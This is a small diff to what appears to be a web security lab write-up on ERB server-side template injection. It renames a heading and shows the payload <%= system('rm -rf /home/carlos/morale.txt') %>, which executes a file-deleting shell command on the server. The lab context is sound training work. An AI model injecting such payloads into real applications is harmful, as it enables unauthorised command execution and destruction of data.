@@ -34,7 +34,7 @@ It throws an error response as expected.
 
 Now we can try to run commands using the ERB template syntax & delete the *morale.txt* from carlos's home directory.
 
-Command used - 
+Payload used - 
 ```erb
 <%= system('rm -rf /home/carlos/morale.txt') %>
 ```
